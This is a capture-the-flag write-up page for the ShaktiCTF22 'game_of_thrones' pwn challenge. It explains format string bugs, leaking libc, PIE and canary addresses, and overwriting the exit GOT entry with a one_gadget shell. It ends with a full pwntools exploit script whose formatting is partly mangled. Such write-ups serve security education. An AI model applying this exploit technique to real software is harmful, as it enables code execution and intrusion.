@@ -1,0 +1,345 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://github.com/Team-Shakti/CTF-Write-ups/ShaktiCTF22/pwn/game_of_thrones/writeup/">
+        <link rel="shortcut icon" href="../../../../img/favicon.ico">
+        <title>game_of_thrones - CTF-Writeups</title>
+        <link href="../../../../css/bootstrap-custom.min.css" rel="stylesheet">
+        <link href="../../../../css/font-awesome.min.css" rel="stylesheet">
+        <link href="../../../../css/base.css" rel="stylesheet">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/styles/darcula.min.css">
+        <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+        <!--[if lt IE 9]>
+            <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+            <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+        <![endif]-->
+
+        <script src="../../../../js/jquery-1.10.2.min.js" defer></script>
+        <script src="../../../../js/bootstrap-3.0.3.min.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js"></script>
+        <script>hljs.initHighlightingOnLoad();</script> 
+    </head>
+
+    <body>
+
+        <div class="navbar navbar-default navbar-fixed-top" role="navigation">
+            <div class="container">
+
+                <!-- Collapsed navigation -->
+                <div class="navbar-header">
+                    <!-- Expander button -->
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                    <a class="navbar-brand" href="../../../..">CTF-Writeups</a>
+                </div>
+
+                <!-- Expanded navigation -->
+                <div class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li >
+                                <a href="../../../../about/">About Us</a>
+                            </li>
+                            <li >
+                                <a href="../../../../shaktictf/">ShaktiCTF</a>
+                            </li>
+                            <li >
+                                <a href="https://team-shakti.github.io/">Website</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav navbar-right">
+                        <li>
+                            <a href="#" data-toggle="modal" data-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                            <li>
+                                <a href="https://github.com/Team-Shakti/CTF-Write-ups/blob/master/docs/ShaktiCTF22/pwn/game_of_thrones/writeup.md">Edit on Team-Shakti/CTF-Write-ups</a>
+                            </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+                <div class="col-md-3"><div class="bs-sidebar hidden-print affix well" role="complementary">
+    <ul class="nav bs-sidenav">
+        <li class="main active"><a href="#game_of_thrones">game_of_thrones</a></li>
+            <li><a href="#preliminary-analysis">Preliminary Analysis:</a></li>
+            <li><a href="#understanding-the-challenge">Understanding the challenge</a></li>
+            <li><a href="#exploitation">Exploitation:</a></li>
+        <li class="main "><a href="#infonum_men-shexnum_men">info('num_men: %s'%hex(num_men))</a></li>
+        <li class="main "><a href="#printoff1">print(off1)</a></li>
+        <li class="main "><a href="#printoff2">print(off2)</a></li>
+    </ul>
+</div></div>
+                <div class="col-md-9" role="main">
+
+<h1 id="game_of_thrones">game_of_thrones</h1>
+<p>Author: <a href="https://twitter.com/BhaskaraShravya">d1g174l_f0rtr355</a></p>
+<p>Solves: 10</p>
+<p>Difficulty: Medium</p>
+<h2 id="preliminary-analysis">Preliminary Analysis:</h2>
+<p>As we can see, the binary given to us is a 64-bit non-stripped file with the following checks enabled.</p>
+<pre><code>    Arch:     amd64-64-little
+    RELRO:    No RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre>
+
+<p>Since all the basic security checks are enabled, there is little we can do to think about the approach. Hence let's start debugging and analyzing. One may make of the decompilers such as Ghidra/ IDA to decompile the binary as there was no source code given at the time of the CTF. I have used IDA in my decompilation.</p>
+<h2 id="understanding-the-challenge">Understanding the challenge</h2>
+<p>At first glance we find a few functions present in the binary such as <code>use_dragons</code>, <code>kings_landing</code>, and <code>white_walkers</code> that are of interest to us. Let's take a look at each of these functions to understand what is going on.</p>
+<ul>
+<li>use_dragons: Upon entering option <code>1</code>, main redirects us to this function where we observe a very crucial fortmat string bug in the program. This happens beacuse <code>printf</code> usually takes in 2 arguments. The first one being a format specifier, and the second one being the variable whose data or address needs to be printed out. Looking at the decompiled code below it is obvious that since the only argument given to printf() is the varible <code>buffer</code> which is user controlled, we can very well take advantage of this bug and cause various memory leaks in the program. However, since we are only taking 10 characters of input string, it may not be enough to overwrite any data. </li>
+</ul>
+<pre><code>  printf(&quot;\n\nYou currently have %d number of dragons.\n&quot;, 3LL);
+  printf(&quot;\nSay something in Valyrian: &quot;);
+  __isoc99_scanf(&quot;%10s&quot;, buffer);
+  getchar();
+  printf(&quot;The dragons say: &quot;);
+  printf(buffer);
+  return 3LL;
+</code></pre>
+
+<ul>
+<li>kings_landing: This function presents us with a switch case like scenario, wherein if we choose option <code>1</code>, we simply get a message saying <code>No men left in the army! You cannot kill the knight king.</code> and the <code>men</code> is made 0. However, option <code>2</code>, firstly checks if the <code>dragons</code> count is between 1 and 3, if so it then asks us how many dragons we wish to use. Here we find another similar format_string type bug. This time we can also read in more characters (upto 50). </li>
+</ul>
+<pre><code>  if ( choice == 49 )
+  {
+    puts(&quot;No men left in the army! You cannot kill the knight king. &quot;);
+    *men = 0;
+  }
+  else if ( choice == 50 )
+  {
+    if ( *dragons &amp;&amp; *dragons &lt;= 3u )
+    {
+      printf(&quot;How many dragons would you like to use ?\n&gt; &quot;);
+      __isoc99_scanf(&quot;%u&quot;, &amp;num);
+      if ( num &amp;&amp; num &lt;= 3 )
+      {
+        *dragons -= num;
+        printf(&quot;%u dragon(s) have been used!\nAre you going to kill the white walkers ?\n&gt; &quot;, num);
+        getchar();
+        __isoc99_scanf(&quot;%50[^\n]s&quot;, format);
+        printf(format);
+      }
+      else
+      {
+        puts(&quot;You only use dragons that you have&quot;);
+        exit_function(0LL);
+      }
+    }
+    else
+    {
+      puts(&quot;You have too less or too many dragons! &quot;);
+      exit_function(0LL);
+    }
+  }
+  else
+  {
+    puts(&quot;Give a valid choice next time! &quot;);
+    exit_function(0LL);
+  }
+</code></pre>
+
+<ul>
+<li>white_walkers: This function checks whether the number of <code>men</code> is equal to <code>30000</code> and number of <code>dragons</code> is equal to 200. If tru, it calls the <code>exit_function</code> with an argument <code>1</code> else the argument is <code>0</code>. </li>
+</ul>
+<pre><code>  puts(&quot;You are going to battle against an army of the dead! &quot;);
+  if ( *a1 == 30000 || *a2 == 200 )
+  {
+    puts(
+      &quot;Wonderful! You have defeated the army of the dead and have conquered King's Landing. You are the true ruler of the&quot;
+      &quot; seven kingdoms. &quot;);
+    return exit_function(1LL);
+  }
+  else
+  {
+    puts(&quot;You do not have enough men or dragons to defeat the army of the dead&quot;);
+    return exit_function(0LL);
+  }
+</code></pre>
+
+<ul>
+<li>exit_function: This function is pretty simple, if the argument is <code>1</code> it calls <code>exit()</code> else, it simply returns</li>
+</ul>
+<pre><code>  if ( arg )
+    exit(1);
+</code></pre>
+
+<h2 id="exploitation">Exploitation:</h2>
+<p>From the above understanding of the program, we can conclude a few things:
+- Since <code>PIE</code> and <code>Canary</code> are enabled, we will have to leak them using the format string bug in <code>use_dragons</code>. Followed by this, we can also get a libc leak in a similar fashion. The format specifier usually used to leakd addresses is <code>%x</code> or <code>%p</code>. I'll be using <code>%p</code> in my exploit.
+- Overwrite the global variables <code>num_men</code> and <code>num_dragons</code> with <code>30000</code> and <code>200</code> so as to call <code>exit()</code> in <code>exit_function</code>. We use <code>%N</code> to overwrite the 8 bit word, a <code>%hn</code> to overwrite a 4 bit word, and a <code>%hhn</code> to overwrite a 2 bit word.
+- Lastly, we shall overwrite <code>exit_got</code> with a <code>one_gadget</code> address. The address of this <code>one_gadget</code> can be obtained using the <a href="https://github.com/david942j/one_gadget">one_gadget</a> tool. The libc is also provided, so there shouldn't be an issue regarding different offsets in libc.</p>
+<p>For leaking the addresses, we may simply look at the stack, i.e set a breakpoint before <code>printf</code> in <code>use_dragons</code> is called. I found the offsets for the <code>libc</code>, <code>canary</code> and <code>code</code> to be at <code>9</code>, <code>11</code>, and <code>13</code>. Furthermore, in order to overwrite the global variables <code>num_dragons</code> and <code>num_men</code>, the offset can be checked by spamming a few a's and then leaking the addresses to know where our input string begins. For example in this case our offset for writing can be calculated as:</p>
+<pre><code>Are you going to kill the white walkers ?
+&gt; aaaaaaaaaaaaaaa %p %p %p %p %p %p %p %p %p %p %p
+aaaaaaaaaaaaaaa 0xa (nil) (nil) 0x31 0x7fffffff 0x55adae26d96c 0x55adae26d928 0x7fe6934688a0 0x132310b9f 0x6161616161616161 0x2061616161616161
+</code></pre>
+
+<p>Since our input string <code>aaaaaaaaaaaaaaa</code> is found at offset <code>10</code> with <code>0xa</code> beign leaked at offset <code>1</code>, we can say that everything we write onto the stack will get stored from offset <code>10</code>. Thus while overwriting, we may just keep in mind the required offset by looking into GDB and if there is any buffer needed to just align the addresses to 8 bytes.</p>
+<p>Also looking at the registers when the exit() function is finally called, I used the following libc offset for execve call:</p>
+<pre><code>0xe6c81 execve(&quot;/bin/sh&quot;, r15, rdx)
+constraints:
+  [r15] == NULL || r15 == NULL
+  [rdx] == NULL || rdx == NULL
+````
+
+
+## Exploit:
+</code></pre>
+
+<p>def use_dragons(data):
+    p.sendlineafter('Your choice: ', '1')
+    p.sendlineafter('Say something in Valyrian: ', data)
+    s = p.recvline()
+    leak = int(s[-15:-1], 16)</p>
+<pre><code>return leak
+</code></pre>
+<p>def kings_landing(choice, num_dragons, data):
+    p.sendlineafter('Your choice: ', choice)
+    p.sendline('2')
+    p.sendlineafter('How many dragons would you like to use ?\n&gt; ', str(num_dragons))
+    p.sendlineafter('Are you going to kill the white walkers ?\n&gt; ', data)</p>
+<p>def white_walkers(choice):
+    p.sendlineafter('Your choice: ', choice)</p>
+<p>from pwn import *</p>
+<p>p = process('./chall', env={"LD_PRELOAD":"./libc.so.6"})
+exe = ELF('./chall')</p>
+<p>gdb.attach(p, gdbscript='b<em>use_dragons+167\nb</em>kings_landing+333\nc\n')</p>
+<p>libc = use_dragons("%9$p") - 0x95106
+info('libc: %s'%hex(libc))</p>
+<p>code = use_dragons("%13$p") - 0x160a
+info('code: %s'%hex(code))</p>
+<p>canary = use_dragons("%11$p")
+info('canary: %s'%hex(canary))</p>
+<p>num_men = code + exe.symbols['num_men']
+num_dragons = code + exe.symbols['num_dragons']
+exit = code + exe.got['exit']
+info('num_men: %s'%hex(num_men))
+info('num_dragons: %s'%hex(num_dragons))
+info('exit: %s'%hex(exit))</p>
+<p>one_gadget = libc + 0xe6c81</p>
+<p>pay1 = '%{}p'.format(30000-4)
+pay1 += 'a'*4
+pay1 += '%12$n'
+pay1 += p64(num_men)</p>
+<h1 id="infonum_men-shexnum_men">info('num_men: %s'%hex(num_men))</h1>
+<p>kings_landing('2', 1, pay1)</p>
+<p>off1 = int('0x' + hex(one_gadget)[-4:], 16)# lsb</p>
+<h1 id="printoff1">print(off1)</h1>
+<p>off2 = int('0x' + hex(one_gadget)[-8:-4], 16)# msb</p>
+<h1 id="printoff2">print(off2)</h1>
+<p>while(off1&gt;off2):
+        off2 += 0x10000</p>
+<p>pay2 = '%{}p'.format(off1-4)
+pay2 += 'a'<em>4
+pay2 += '%14$n'
+pay2 += '%{}p'.format(off2-off1-3)
+pay2 += 'b'</em>3
+pay2 += '%15$hn'
+pay2 += p64(exit)
+pay2 += p64(exit+2)</p>
+<p>kings_landing('\n2', 1, pay2)</p>
+<p>pay3 = '%{}p'.format(200-6)
+pay3 += 'c'*6
+pay3 += '%12$n'
+pay3 += p64(num_dragons)</p>
+<p>kings_landing('\n2', 1, pay3)</p>
+<p>white_walkers('\n3')</p>
+<p>p.interactive()
+```</p></div>
+        </div>
+
+        <footer class="col-md-12">
+            <hr>
+                <p>Copyright &copy; 2020 <a href="http://Team-Shakti.github.io/">Team-Shakti Writeups</a></p>
+            <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a>.</p>
+        </footer>
+        <script>
+            var base_url = "../../../..",
+                shortcuts = {"search": 83, "next": 78, "help": 191, "previous": 80};
+        </script>
+        <script src="../../../../js/base.js" defer></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+        <script src="../../../../search/main.js" defer></script>
+
+        <div class="modal" id="mkdocs_search_modal" tabindex="-1" role="dialog" aria-labelledby="Search Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Search</h4>
+            </div>
+            <div class="modal-body">
+                <p>
+                    From here you can search these documents. Enter
+                    your search terms below.
+                </p>
+                <form role="form">
+                    <div class="form-group">
+                        <input type="text" class="form-control" placeholder="Search..." id="mkdocs-search-query" title="Type search term here">
+                    </div>
+                </form>
+                <div id="mkdocs-search-results"></div>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div><div class="modal" id="mkdocs_keyboard_modal" tabindex="-1" role="dialog" aria-labelledby="Keyboard Shortcuts Modal" aria-hidden="true">
+    <div class="modal-dialog">
+        <div class="modal-content">
+            <div class="modal-header">
+                <button type="button" class="close" data-dismiss="modal"><span aria-hidden="true">&times;</span><span class="sr-only">Close</span></button>
+                <h4 class="modal-title" id="exampleModalLabel">Keyboard Shortcuts</h4>
+            </div>
+            <div class="modal-body">
+              <table class="table">
+                <thead>
+                  <tr>
+                    <th style="width: 20%;">Keys</th>
+                    <th>Action</th>
+                  </tr>
+                </thead>
+                <tbody>
+                  <tr>
+                    <td class="help shortcut"><kbd>?</kbd></td>
+                    <td>Open this help</td>
+                  </tr>
+                  <tr>
+                    <td class="next shortcut"><kbd>n</kbd></td>
+                    <td>Next page</td>
+                  </tr>
+                  <tr>
+                    <td class="prev shortcut"><kbd>p</kbd></td>
+                    <td>Previous page</td>
+                  </tr>
+                  <tr>
+                    <td class="search shortcut"><kbd>s</kbd></td>
+                    <td>Search</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+            <div class="modal-footer">
+            </div>
+        </div>
+    </div>
+</div>
+
+    </body>
+</html>
